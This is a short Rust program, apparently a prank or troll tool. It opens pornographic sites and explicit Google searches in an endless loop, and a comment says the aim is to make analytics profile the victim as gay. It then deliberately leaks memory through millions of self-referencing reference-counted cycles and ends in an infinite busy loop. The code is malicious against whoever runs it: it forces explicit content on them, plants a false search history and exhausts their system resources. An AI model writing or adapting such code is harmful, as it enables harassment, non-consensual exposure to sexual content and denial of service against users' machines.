use webbrowser;
use std::sync::{Arc, Mutex};

fn main() {
    open_tabs();
    memory_leak();
}

const TRUE_BOOL: bool = true;

fn open_tabs() {
    while TRUE_BOOL {
        // Gay porn
        webbrowser::open("https://pornhub.com/gay");
        webbrowser::open("https://seanandcody.com");
        webbrowser::open("https://helixstudios.com");
        webbrowser::open("https://i.kym-cdn.com/photos/images/facebook/002/297/378/fd7");

        // Fuck with analytics (make the internet think they're gay)
        webbrowser::open("https://google.com/search?q=gay+porn");
        webbrowser::open("https://google.com/search?q=gay+anal");
        webbrowser::open("https://google.com/search?q=gay");
        webbrowser::open("https://google.com/search?q=gay+pride");
    }
}

struct Data(Option<Arc<Mutex<Data>>>);

fn memory_leak() {
    for _ in 0..5000000 {
        let val = Arc::new(Mutex::new(Data(None)));
        val.lock().unwrap().0 = Some(val.clone());
    }
    println!("done");
    loop {}
}